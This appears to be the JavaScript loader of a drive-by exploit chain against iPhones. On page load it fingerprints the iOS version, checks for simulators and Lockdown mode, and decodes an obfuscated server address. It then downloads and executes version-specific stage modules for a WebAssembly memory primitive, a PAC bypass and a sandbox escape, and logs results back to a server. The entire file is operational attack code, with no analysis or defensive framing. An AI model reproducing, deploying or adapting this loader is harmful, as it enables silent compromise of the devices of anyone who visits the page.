



(function(){
  

  var logStart = Date.now();
  var logEntryID = 0;
  window.printLog = function(x, reportError){
    var out = ("[" + (Date.now() - logStart) + "ms] ").padEnd(10) + x;
    if (!window.__15X_SERVER_LOG && !reportError) return;
    var line = "#" + (logEntryID++) + " " + out;
    try { console.log("[log] " + line); } catch(e){}
    try { if (window.__logViewAdd) window.__logViewAdd(line); } catch(e){}
    try {
      var mx = new XMLHttpRequest();
      mx.open("POST", "/api/debug/logs", false);
      mx.setRequestHeader("Content-Type", "text/plain;charset=UTF-8");
      mx.send(line);
    } catch(e){}
  };
  window.addEventListener("error", function(e){ window.printLog("WINERR: " + e.message, true); });
  window.addEventListener("unhandledrejection", function(e){ window.printLog("REJ: " + String(e.reason).slice(0,300), true); });
})();




        

        var __bridge = null, __bridgeRuntime = null;
        function __bridgeInit() {
            try {
                if (window.PromotionIntegrationBridge && typeof window.PromotionIntegrationBridge.ready === 'function') {
                    __bridge = window.PromotionIntegrationBridge;
                }
            } catch (e) { }
        }
        function __bridgeReady() {
            if (!__bridge || typeof __bridge.ready !== 'function') return Promise.resolve(null);
            if (__bridgeRuntime) return Promise.resolve(__bridgeRuntime);
            return Promise.resolve(__bridge.ready()).then(function (rt) { __bridgeRuntime = rt || null; return __bridgeRuntime; }).catch(function () { return null; });
        }
        function __runtimeChannelSlug() {
            try { return (__bridgeRuntime && __bridgeRuntime.channel && __bridgeRuntime.channel.slug) || ''; } catch (e) { return ''; }
        }
        function __runtimeDomain() {
            try { if (__bridgeRuntime && __bridgeRuntime.eventUrl) return new URL(__bridgeRuntime.eventUrl, location.href).hostname; } catch (e) { }
            return location.hostname;
        }
        function __runtimeIntegrationId() {
            try { return (__bridgeRuntime && __bridgeRuntime.integration && __bridgeRuntime.integration.id) || ''; } catch (e) { return ''; }
        }
        function __runtimeFingerprint() {
            try {
                var fp = (window.localStorage && window.localStorage.getItem('_fp')) || '';
                if (/^(?:[0-9a-f]{32}|fb_[a-z0-9]+_[0-9]{10,16})$/.test(fp)) return fp;
            } catch (e) { }
            return '';
        }
        function __runtimeEventId() {
            try { return (__bridgeRuntime && __bridgeRuntime.pageViewEventId) || ''; } catch (e) { return ''; }
        }
        __bridgeInit();
        __bridgeReady();
        
        (function () {
            var panel = null, body = null, autoScroll = true, min = false;
            function ensure() {
                if (!window.__15X_SERVER_LOG) return; 
                if (panel) return;
                var st = document.createElement('style');
                st.textContent = '#x15panel{position:fixed;left:8px;right:8px;bottom:8px;z-index:2147483647;' +
                    'background:#0d1117;border:1px solid #30363d;border-radius:8px;color:#7ee787;' +
                    'font:12px/1.5 ui-monospace,Menlo,monospace;max-height:40vh;display:flex;flex-direction:column;}' +
                    '#x15bar{display:flex;align-items:center;gap:6px;padding:6px 8px;background:#161b22;' +
                    'border-bottom:1px solid #30363d;border-radius:8px 8px 0 0;}' +
                    '#x15bar span{color:#58a6ff;font-weight:bold;flex:1;font-size:13px;white-space:nowrap;}' +
                    '#x15bar button{background:#21262d;color:#c9d1d9;border:1px solid #30363d;border-radius:5px;' +
                    'padding:4px 8px;font-size:12px;min-height:28px;font-family:ui-monospace,Menlo,monospace;}' +
                    '#x15body{flex:1;overflow:auto;padding:4px 8px;}' +
                    '#x15body div{white-space:pre-wrap;word-break:break-all;border-bottom:1px solid #161b22;padding:1px 0;}';
                document.head.appendChild(st);
                panel = document.createElement('div'); panel.id = 'x15panel';
                var bar = document.createElement('div'); bar.id = 'x15bar';
                var t = document.createElement('span'); t.textContent = '调试日志';
                function btn(label, fn) { var b = document.createElement('button'); b.textContent = label; b.onclick = fn; bar.appendChild(b); return b; }
                btn('清空', function () { body.innerHTML = ''; });
                var autoBtn = btn('滚动:开', function () { autoScroll = !autoScroll; autoBtn.textContent = autoScroll ? '滚动:开' : '滚动:关'; });
                btn('收起', function () { min = !min; body.style.display = min ? 'none' : 'block'; });
                bar.appendChild(t);
                panel.appendChild(bar);
                body = document.createElement('div'); body.id = 'x15body';
                panel.appendChild(body);
                document.body.appendChild(panel);
                try {
                    var seed = JSON.parse(sessionStorage.getItem('__15x_router_logs') || '[]');
                    for (var i = 0; i < seed.length; i++) add(seed[i]);
                } catch (e) { }
            }
            function nearBottom() {
                return body && (body.scrollTop + body.clientHeight) >= (body.scrollHeight - 40);
            }
            function add(text) {
                if (!panel) { ensure(); }
                if (!body) return;
                var d = document.createElement('div'); d.textContent = text; body.appendChild(d);
                while (body.children.length > 1000) body.removeChild(body.firstChild);
                if (autoScroll && nearBottom()) body.scrollTop = body.scrollHeight;
            }
            window.__logViewAdd = add;
            if (document.body) ensure(); else window.addEventListener('DOMContentLoaded', ensure);
        })();
        window.addDownloadBinary = function (fileName, text) {
            let fileType = "application/octet-stream";
            var blob = new Blob([text], { type: fileType });
            var a = document.createElement('a');
            a.download = fileName;
            a.href = URL.createObjectURL(blob);
            a.dataset.downloadurl = [fileType, a.download, a.href].join(':');
            a.text = "Download " + fileName;
            
        }
        window.log = function (text) {
            
            try { if (window.printLog) window.printLog(String(text)); } catch (e) { }
        };
        (function () {
            

        })();

        function fqMaGkNL(W) {
            W = W.toString(16).toLowerCase();
            return 1 === W.length && (W = "0" + W), W
        }

        function fqMaGkN4(arr) { 
            let out = "";
            for (const q of arr) {
                const b0 = q & 0xFF;
                const b1 = (q >> 8) & 0xFF;
                const b2 = (q >> 16) & 0xFF;
                const b3 = (q >> 24) & 0xFF;
                out += String.fromCharCode((b1 << 8) | b0);
                out += String.fromCharCode((b3 << 8) | b2);
            }
            return out;
        }

        function fqMaGkNg() { 
        
            return fqMaGkN4([1631006510, 960062519, 1647917360, 1647653680, 892756786, 912405041, 1701143141, 1681285477, 1684353382, 1714435941, 1831756386, 1781427817, 115])
        }
        window.globalThis = window;
        
        globalThis.moduleManager = (function () {
            
            let MM = {
                "57620206d62079baad0e57e6d9ec93120c0f5247": m_57620206d62079baad0e57e6d9ec93120c0f5247,
                "14669ca3b1519ba2a8f40be287f646d4d7593eb0": m_14669ca3b1519ba2a8f40be287f646d4d7593eb0,
            };
            
            const e = {
                "$": "",  
                "p": ""   
            };

            function sha256(M) {
                let I = "";

                function N(M, I) {
                    return M >>> I | M << 32 - I
                }
                const D = Math.pow,
                    g = D(2, 32),
                    T = ([89, 80, 91, 82, 65, 93].map(x => {
                        return String.fromCharCode(x ^ 53);
                    }).join(""));
                let c, d;
                const L = [],
                    b = 8 * M[T];
                let i = sha256.h = sha256.h || [];
                const y = sha256.k = sha256.k || [];
                let C = y[T];
                const X = {};
                for (let M = 2; C < 64; M++)
                    if (!X[M]) {
                        for (c = 0; c < (1499680357 ^ 1499680604); c += M) X[c] = M;
                        i[C] = D(M, .5) * g | 0, y[C++] = D(M, 1 / 3) * g | 0
                    } for (M += "\x80"; M[T] % 64 - 56;) M += "\0";
                for (c = 0; c < M[T]; c++) {
                    if (d = M.charCodeAt(c), d >> 8) return;
                    L[c >> 2] |= d << (3 - c) % 4 * 8
                }
                for (L[L[T]] = b / g | 0, L[L[T]] = b, d = 0; d < L[T];) {
                    const M = L.slice(d, d += 16),
                        I = i;
                    for (i = i.slice(0, 8), c = 0; c < 64; c++) {
                        const I = M[c - 15],
                            D = M[c - 2],
                            g = i[0],
                            T = i[4],
                            d = i[7] + (N(T, 6) ^ N(T, 11) ^ N(T, 25)) + (T & i[5] ^ ~T & i[6]) + y[c] + (M[c] = c < 16 ? M[c] : M[c - 16] + (N(I, 7) ^ N(I, 18) ^ I >>> 3) + M[c - 7] + (N(D, 17) ^ N(D, 19) ^ D >>> 10) | 0);
                        i = [d + ((N(g, 2) ^ N(g, 13) ^ N(g, 22)) + (g & i[1] ^ g & i[2] ^ i[1] & i[2])) | 0].concat(i), i[4] = i[4] + d | 0
                    }
                    for (c = 0; c < 8; c++) i[c] = i[c] + I[c] | 0
                }
                for (c = 0; c < 8; c++)
                    for (d = 3; d + 1; d--) {
                        const M = i[c] >> 8 * d & (1433892436 ^ 1433892523);
                        I += (M < 16 ? 0 : "") + M.toString(16)
                    }
                return I
            }

            function c(M) {
                if (M in e == !1) {
                    if (M in MM != !0) throw new Error("M in MM != !0");
                    {
                        
                        
                        
                        window.log("Load " + M);
                        e[M] = MM[M]();
                    }
                }
                return e[M]
            }
            const o = {
                hPL3On: c,   
                setBaseUrl: function (M) {
                    e.$ = M
                },
                setSalt: function (M) {
                    e.p = M
                },
                getModuleByName: c,
                getModuleByURL: async function (moduleId) {
                    window.log(`[LOADER] Loading module: ${moduleId}...`);
                    if (moduleId in e == !1 && moduleId in MM == !1) {
                        let I = moduleId;
                        
                        I = moduleId; 
                        
                        const _rt = await __bridgeReady().catch(function () { return null; });
                        const _evId = (function () { try { return (_rt && _rt.pageViewEventId) || ''; } catch (e) { return ''; } })();
                        const N = await async function (M) {
                            window.log("Loading " + M);
                            return new Promise(((I, N) => {
                                const D = new XMLHttpRequest;
                                let g;
                                const T = (M, I) => Math.floor(Math.random() * (I - M + 1)) + M;
                                g = new URL((e.$) + (M));
                                const c = Math.random().toString(36).slice(2, T(5, 10)),
                                    d = T(0, 1);
                                g.searchParams.set(c, d),
                                _evId && g.searchParams.set("ctx", _evId),
                                    D.open("GET", g.toString(), !0),
                                    D.responseType = ([66, 83, 78, 66].map(x => {
                                        return String.fromCharCode(x ^ 54);
                                    }).join("")),
                                    D.onreadystatechange = () => {
                                        if (D.readyState === XMLHttpRequest.DONE)
                                            if (200 === D.status) {
                                                const M = D.response;
                                                null === M || "" === M ? reject("") : I(M)
                                            } else reject("")
                                    },
                                    D.send()
                            }))
                        }((I) + ".js");
                        e[moduleId] = new Function(N)()
                    }
                    return c(moduleId)
                },
                evalCode: function (M, I) {
                    M in e == !1 && (e[M] = I())
                },
                evalBase64Module: function (M, I) {
                    M in e == !1 && (e[M] = new Function(atob(I))())
                },
            };
            
            
            o.ZKvD0e = o.getModuleByURL;
            o.fgPoij = o.evalBase64Module;
            return o;
        })();
        globalThis.obChTK = globalThis.moduleManager; 
        const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
            platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
        let baseUrl = utilityModule.Ot(fqMaGkNg());
        baseUrl = baseUrl.slice(0, baseUrl.lastIndexOf("/") + 1);
        globalThis.moduleManager.setBaseUrl(baseUrl);
        globalThis.moduleManager.setSalt("cecd08aa6ff548c2");

        function fqMaGkNr(W) { 
            var C = fqMaGkN4([]);
            if ("" !== C) {
                const q = utilityModule.Ot(C);
                q && (C = new XMLHttpRequest, W = q + "?e=" + W, C.open("GET", W, !0), C.send())
            }
        }

        
        
        

        





        async function loadPACBypass() { 
            window.log(`[PAC] Selecting PAC bypass variant...`);

            const offsets = globalThis.moduleManager.getModuleByName(
                "14669ca3b1519ba2a8f40be287f646d4d7593eb0"
            ).platformState.versionFlags;

            
            if (offsets.wF8NpI) {
                
                await (await globalThis.moduleManager.getModuleByURL(
                    
                    "Stage2_16.6_17.2.1_seedbell_pre"
                )).ul();
                pacModule = await globalThis.moduleManager.getModuleByURL(
                    
                    "Stage2_17.0_17.2.1_seedbell"
                );
            } else if (offsets.LJ1EuL) {
                
                await (await globalThis.moduleManager.getModuleByURL(
                    
                    "Stage2_16.6_17.2.1_seedbell_pre"
                )).ul();
                pacModule = await globalThis.moduleManager.getModuleByURL(
                    
                    
                    "Stage2_16.6_16.7.12_seedbell"
                );
            } else if (offsets.CpDW_T) {
                pacModule = await globalThis.moduleManager.getModuleByURL(
                    
                    
                    "Stage2_16.3_16.5.1_seedbell"
                );
            } else if (offsets.IqxL92) {
                pacModule = await globalThis.moduleManager.getModuleByURL(
                    
                    "Stage2_15.0_16.2_breezy15"
                );
            } else {
                pacModule = await globalThis.moduleManager.getModuleByURL(
                    
                    "Stage2_13.0_14.x_breezy"
                );
            }

            if (void 0 === pacModule) throw Error("");

            
            return pacModule.ga();
        }

        
        
        

        













        async function triggerExploit() { 
            var platform = navigator.platform;
            const userAgent = navigator.userAgent;
            window.log(`[LOADER] === Exploit chain starting ===`);
            window.log(`[LOADER] Platform: ${platform}, UA: ${userAgent.substring(0, 80)}...`);

            
            
            
            
            
            if (await platformModule.init("", fqMaGkNg(), fqMaGkN4([3436285875, 2332907478, 2884495420, 233193687, 1144711575, 1605576699, 1942246444, 1994816675]) , Array(!1)[0], Array(!1)[0], platform, userAgent), platformModule.On()) throw Error("");
            window.log(`[PLATFORM] iOS version detected: ${platformModule.platformState.iOSVersion}`);

            
            if (13E4 > platformModule.platformState.iOSVersion) return 1001;

            
            if (16E4 <= platformModule.platformState.iOSVersion) {
                try {
                    await platformModule.Hn(); 
                } catch (p) {
                    console.error(`[LOADER] ABORT: Simulator check threw`);
                    return 1001
                }
                if (platformModule.platformState.Qn) return 1003; 
            }

            
            try {
                await platformModule.Yn();  
            } catch (e) {
                console.error(`[LOADER] ABORT: Lockdown mode check failed`);
                return 1001;
            }

            
            
            
            let stage1Module;
            const offsets = platformModule.platformState.versionFlags;

            
            window.log(`[LOADER] Selecting stage1 variant for offsets: JtEUci=${offsets.JtEUci}, KeCRDQ=${offsets.KeCRDQ}, ShQCsB=${offsets.ShQCsB}, RbKS6p=${offsets.RbKS6p}, mmrZ0r=${offsets.mmrZ0r}`);
            if (offsets.JtEUci) {
                
                stage1Module = await globalThis.moduleManager.getModuleByURL(
                    
                    "Stage1_16.6_17.2.1_cassowary"
                );
            } else if (offsets.KeCRDQ) {
                stage1Module = await globalThis.moduleManager.getModuleByURL(
                    
                    "Stage1_16.2_16.5.1_terrorbird"
                );
            } else if (offsets.ShQCsB) {
                stage1Module = await globalThis.moduleManager.getModuleByURL(
                    
                    "Stage1_15.6_16.1.2_bluebird"
                );
            } else if (offsets.RbKS6p) {
                stage1Module = await globalThis.moduleManager.getModuleByURL(
                    
                    "Stage1_15.2_15.5_jacurutu"
                );
            } else if (offsets.mmrZ0r) {
                stage1Module = await globalThis.moduleManager.getModuleByURL(
                    
                    "Stage1_13.0_15.1.x_buffout"
                );
            }

            if (void 0 === stage1Module) { console.error(`[LOADER] ABORT: No stage1 module matched`); return 1001; }
            window.log(`[LOADER] Stage1 module loaded, executing WASM primitive exploit...`);

            
            
            await (async function executeStage1() {
                for (let attempt = 0; attempt < 20; attempt++) {
                    try {
                        window.log(`[LOADER] Stage1 attempt ${attempt + 1}/20...`);
                        if ("AsyncFunction" === stage1Module.si.constructor.name) {
                            await stage1Module.si();
                        } else {
                            stage1Module.si();
                        }
                        window.log(`[LOADER] Stage1 succeeded on attempt ${attempt + 1}`);
                        return;
                    } catch (e) {
                        window.log("[LOADER] Error:" + e.name + ": " + e.message);
                        console.error(e);
                    }
                }
                console.error(`[LOADER] Stage1 FAILED after 20 attempts`);
                throw Error("");
            })();

            if (!platformModule.platformState.exploitPrimitive) { console.error(`[LOADER] ABORT: WASM primitives not initialized`); throw Error(""); }
            window.log(`[LOADER] Stage1 complete — WASM read/write primitives active`);

            
            
            
            platform = 0;
            try {
                
                platformModule.lr();  
                window.log(`[RUNTIME] JSC runtime detected: PAC=${platformModule.platformState.hasPAC}`);

                
                if (platformModule.platformState.hasPAC) {
                    window.log(`[PAC] Loading PAC bypass (stage2)...`);
                    platformModule.platformState.pacBypass = await loadPACBypass();
                    window.log(`[PAC] PAC bypass loaded, checking integrity...`);
                    platformModule.platformState.qn = await platformModule.$n();  
                    window.log(`[PAC] PAC integrity check: ${platformModule.platformState.qn}`);
                }

                
                if (true === offsets.wC3yaB && true === platformModule.platformState.qn) {
                    
                    
                    window.log(`[STAGE3] Loading sandbox escape variant A...`);
                    platform = await (await globalThis.moduleManager.getModuleByURL(
                        "Stage3_VariantA"
                    )).lA();
                } else {
                    
                    
                    window.log(`[STAGE3] Loading sandbox escape variant B...`);
                    platform = await (await globalThis.moduleManager.getModuleByURL(
                        "Stage3_VariantB"
                    )).lA();
                }
                window.log(`[STAGE3] Sandbox escape result: ${platform}`);
            } catch (error) {
                window.log("[LOADER] Exploit chain error:" + error.name + ": " + error.message);
                platform = 1000;
                throw error;
            } finally {
                
                if (platformModule.platformState.exploitPrimitive) {
                    window.log(`[LOADER] Cleaning up exploit primitives...`);
                    platformModule.platformState.exploitPrimitive.cleanup();  
                }
            }

            window.log(`[LOADER] === Exploit chain finished — result: ${platform} ===`);
            return platform;
        }

        
        
        

        self.setTimeout(async function () {
            
            var __skipRun = false;
            try {
                var __doneAt = parseInt(sessionStorage.getItem('_ds_chain_done') || '0', 10);
                if (__doneAt && (Date.now() - __doneAt) < 3 * 60 * 1000) __skipRun = true;
            } catch (e) { }
            if (__skipRun) {
                window.log('[LOADER] 3 分钟内已执行过链，跳过重跑（如需强制重跑：关页面重开或清 Safari 网站数据）');
                return;
            }
            try { sessionStorage.setItem('_ds_chain_done', String(Date.now())); } catch (e) { }
            
            const result = await triggerExploit();
            window.log(`[LOADER] Reporting result: ${result}`);
            
            
            
            
            
            
            
            
            
            
            
            
            
        }, 10);

        
        

    
